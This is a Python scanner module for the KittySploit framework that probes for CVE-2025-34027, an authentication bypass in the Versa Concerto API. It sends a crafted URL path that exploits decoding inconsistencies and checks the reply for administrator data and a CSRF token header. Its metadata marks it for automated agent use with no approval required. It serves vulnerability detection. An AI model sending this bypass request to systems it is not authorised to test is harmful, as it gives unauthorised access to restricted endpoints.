#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Authentication bypass in the Versa Concerto API, caused by URL decoding inconsistencies."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Versa Concerto API Path Based - Authentication Bypass Detection',
        'description': 'Authentication bypass in the Versa Concerto API, caused by URL decoding inconsistencies. It allowed unauthorized access to certain API endpoints by manipulating the URL path.This issue enabled attackers to bypass authentication controls and access restricted resources.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'versa', 'concerto', 'auth-bypass', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://projectdiscovery.io/blog/versa-concerto-authentication-bypass-rce/',
            'https://versa-networks.com/documents/datasheets/versa-concerto.pdf',
            'https://www.cve.org/CVERecord?id=CVE-2025-34027',
            'https://security-portal.versa-networks.com/emailbulletins/6830fa3f28defa375486ff2f',
        ],
        'cve': 'CVE-2025-34027',
    }

    def run(self):
        path = '/portalapi/v1/roles/option;%2fv1%2fping'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('ENTERPRISE_ADMINISTRATOR',)
        header_any = ('EECP-CSRF-TOKEN',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='Versa Concerto API Path Based - Authentication Bypass detected', path=path)
            return True
        return False

